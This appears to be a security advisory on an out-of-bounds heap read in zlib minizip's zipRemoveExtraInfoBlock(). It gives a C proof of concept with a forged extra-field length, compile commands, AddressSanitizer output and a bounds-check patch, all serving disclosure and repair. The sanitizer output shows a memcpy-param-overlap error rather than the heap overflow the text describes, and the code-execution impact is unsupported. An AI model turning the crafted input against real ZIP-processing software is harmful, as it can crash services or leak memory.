# Heap Buffer Overflow in zlib minizip zipRemoveExtraInfoBlock()

## Vulnerability Summary

| Field                  | Value                                          |
| ---------------------- | ---------------------------------------------- |
| **Vulnerability Type** | Heap Buffer Overflow (Out-of-bounds Read)      |
| **Affected Component** | zlib contrib/minizip (zip.c)                   |
| **Affected Versions**  | zlib 1.3.1 and earlier containing minizip      |
| **CWE Classification** | CWE-122 (Heap-based Buffer Overflow)           |
| **CVSS 3.1 Score**     | 7.5 (High)                                     |
| **Attack Vector**      | Local / Network (via malicious ZIP processing) |

---

## Vulnerability Description

A heap buffer overflow vulnerability exists in the `zipRemoveExtraInfoBlock()` function in `contrib/minizip/zip.c` of the zlib library. This function is an exported public API designed to remove ZIP64 extra information blocks from ZIP archive headers.

The vulnerability occurs because the function reads a `dataSize` value directly from untrusted input data without proper bounds validation. When processing a maliciously crafted extra field block, an attacker can specify an arbitrarily large `dataSize` value that exceeds the actual buffer size, causing `memcpy()` to read beyond the allocated heap buffer.

### Root Cause

```c
// File: contrib/minizip/zip.c, Lines 1901-1956

extern int ZEXPORT zipRemoveExtraInfoBlock(char* pData, int* dataLen, short sHeader) {
  char* p = pData;
  // ...
  
  while(p < (pData + *dataLen))
  {
    header = *(short*)p;           // Read header ID from untrusted input
    dataSize = *(((short*)p)+1);   // VULNERABILITY: Read dataSize without validation!
    
    if( header == sHeader )
    {
      p += dataSize + 4;           // Skip block (no bounds check)
    }
    else
    {
      // HEAP OVERFLOW: memcpy reads dataSize+4 bytes without checking bounds!
      memcpy(pTmp, p, dataSize + 4);
      p += dataSize + 4;
      size += dataSize + 4;
    }
  }
  // ...
}
```

The `dataSize` value (2 bytes, range 0-65535) is read directly from the input buffer and used in `memcpy()` without checking whether `dataSize + 4` exceeds the remaining buffer space (`*dataLen - (p - pData)`).

---

## Impact

### Security Impact

| Impact Type                  | Description                                                  |
| ---------------------------- | ------------------------------------------------------------ |
| **Information Disclosure**   | Reading beyond heap buffer boundaries can leak sensitive data |
| **Denial of Service**        | Crash due to invalid memory access                           |
| **Potential Code Execution** | Heap corruption may lead to arbitrary code execution         |

### Affected Applications

**Any application that:**

1. Uses the minizip library (part of zlib contrib)
2. Calls `zipRemoveExtraInfoBlock()` with untrusted input
3. Processes ZIP64 archives in RAW mode

**Known affected platforms/libraries:**

- Android NDK (contains minizip in `platform/external/zlib.git`)
- pyminizip (Python wrapper)
- SwiftMiniZip (iOS/macOS wrapper)
- Applications using zlib's minizip for ZIP manipulation

---

## Proof of Concept

### PoC Source Code (poc.c)

```c
/*
 * PoC: Heap Buffer Overflow in zipRemoveExtraInfoBlock()
 * 
 * This PoC links against the OFFICIAL minizip library (zip.c/zip.h)
 * to demonstrate the vulnerability using the real implementation.
 * 
 * Compile with ASAN:
 *   gcc -o poc_official poc_official_minizip.c \
 *       -I../../ -I. zip.c ioapi.c ../../libz.a \
 *       -fsanitize=address -g
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "zip.h"  // Include OFFICIAL minizip header

int main(int argc, char* argv[]) {
    printf("=== PoC: Heap Overflow in OFFICIAL zipRemoveExtraInfoBlock ===\n\n");
    
    /*
     * The zipRemoveExtraInfoBlock() function parses ZIP extra field data.
     * Extra field format (per ZIP spec):
     *   - 2 bytes: Header ID
     *   - 2 bytes: Data Size  
     *   - N bytes: Data
     *
     * VULNERABILITY: dataSize is read from untrusted input without validation.
     * If dataSize exceeds buffer bounds, memcpy() causes heap overflow.
     */
    
    // Create a small buffer with malicious extra field header
    int bufferSize = 16;
    char* maliciousData = (char*)malloc(bufferSize);
    if (!maliciousData) {
        perror("malloc");
        return 1;
    }
    
    // Craft malicious extra field:
    // Header ID: 0x5555 (arbitrary, not 0x0001 which is ZIP64)
    // DataSize:  0x7FFF (32767) - FAR exceeds our 16-byte buffer!
    uint16_t header_id = 0x5555;
    uint16_t data_size = 0x7FFF;  // 32767 bytes claimed, only 12 available!
    
    memcpy(maliciousData + 0, &header_id, 2);
    memcpy(maliciousData + 2, &data_size, 2);
    memset(maliciousData + 4, 'A', bufferSize - 4);  // Fill with 'A's
    
    printf("[*] Created malicious extra field buffer:\n");
    printf("    - Actual buffer size: %d bytes\n", bufferSize);
    printf("    - Header ID: 0x%04x\n", header_id);
    printf("    - Claimed dataSize: %d bytes\n", data_size);
    printf("    - Attempting to read: %d bytes total\n", data_size + 4);
    printf("\n");
    
    int dataLen = bufferSize;
    short skipHeader = 0x0001;  // We want to skip ZIP64 header (not in our data)
    
    printf("[*] Calling OFFICIAL zipRemoveExtraInfoBlock()...\n");
    printf("[*] Function will attempt memcpy() of %d bytes from %d byte buffer\n", 
           data_size + 4, bufferSize);
    printf("[*] Expected result: ASAN heap-buffer-overflow or SEGFAULT\n\n");
    
    // Call the REAL function from minizip/zip.c!
    int result = zipRemoveExtraInfoBlock(maliciousData, &dataLen, skipHeader);
    
    // If we reach here without crash, print result
    printf("[?] Function returned: %d\n", result);
    printf("[?] If no ASAN error, try: valgrind ./poc_official\n");
    
    free(maliciousData);
    return 0;
}
```

### Compilation and Execution

```bash
# Navigate to minizip directory
cd zlib-1.3.1/contrib/minizip

# Build zlib first (if not already built)
cd ../.. && make && cd contrib/minizip

# Compile PoC with AddressSanitizer
gcc -o poc poc.c \
    -I../../ -I. zip.c ioapi.c ../../libz.a \
    -fsanitize=address -g

# Run PoC
./poc
```

### Output (ASAN)

```
=================================================================
==694415==ERROR: AddressSanitizer: memcpy-param-overlap: memory ranges [0x502000000030,0x502000008033) and [0x502000000010, 0x502000008013) overlap
    #0 0x79bc648fb16d in memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115
    #1 0x574a24acef85 in zipRemoveExtraInfoBlock /home/yui/STUDY/cve/zlib/zlib-1.3.1/contrib/minizip/zip.c:1929
    #2 0x574a24ac4ac1 in main /home/yui/STUDY/cve/zlib/zlib-1.3.1/contrib/minizip/poc_official_minizip.c:67
    #3 0x79bc6442a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x79bc6442a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x574a24ac4584 in _start (/home/yui/STUDY/cve/zlib/zlib-1.3.1/contrib/minizip/poc_official+0x2584) (BuildId: fcf276eb038ab6d4d8188c3b35a3d65fc54f6e16)

0x502000000040 is located 0 bytes after 16-byte region [0x502000000030,0x502000000040)
allocated by thread T0 here:
    #0 0x79bc648fd9c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x574a24aceeb5 in zipRemoveExtraInfoBlock /home/yui/STUDY/cve/zlib/zlib-1.3.1/contrib/minizip/zip.c:1914
    #2 0x574a24ac4ac1 in main /home/yui/STUDY/cve/zlib/zlib-1.3.1/contrib/minizip/poc_official_minizip.c:67
    #3 0x79bc6442a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x79bc6442a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x574a24ac4584 in _start (/home/yui/STUDY/cve/zlib/zlib-1.3.1/contrib/minizip/poc_official+0x2584) (BuildId: fcf276eb038ab6d4d8188c3b35a3d65fc54f6e16)

0x502000000020 is located 0 bytes after 16-byte region [0x502000000010,0x502000000020)
allocated by thread T0 here:
    #0 0x79bc648fd9c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x574a24ac471b in main /home/yui/STUDY/cve/zlib/zlib-1.3.1/contrib/minizip/poc_official_minizip.c:35
    #2 0x79bc6442a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x79bc6442a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0x574a24ac4584 in _start (/home/yui/STUDY/cve/zlib/zlib-1.3.1/contrib/minizip/poc_official+0x2584) (BuildId: fcf276eb038ab6d4d8188c3b35a3d65fc54f6e16)

SUMMARY: AddressSanitizer: memcpy-param-overlap ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115 in memcpy
==694415==ABORTING
```

![image-20260122152813844](http://gcore.jsdelivr.net/gh/miffyaa/images@main/images20260122152813977.png)

---

## Suggested Fix

Add bounds checking before using `dataSize` in `memcpy()`:

```diff
--- a/contrib/minizip/zip.c
+++ b/contrib/minizip/zip.c
@@ -1916,6 +1916,13 @@ extern int ZEXPORT zipRemoveExtraInfoBlock(char* pData, int* dataLen, short sHea
     header = *(short*)p;
     dataSize = *(((short*)p)+1);

+    // Security fix: Validate dataSize against remaining buffer
+    int remaining = *dataLen - (int)(p - pData);
+    if (dataSize + 4 > remaining) {
+      retVal = ZIP_PARAMERROR;
+      break;
+    }
+
     if( header == sHeader )
     {
       p += dataSize + 4;
```

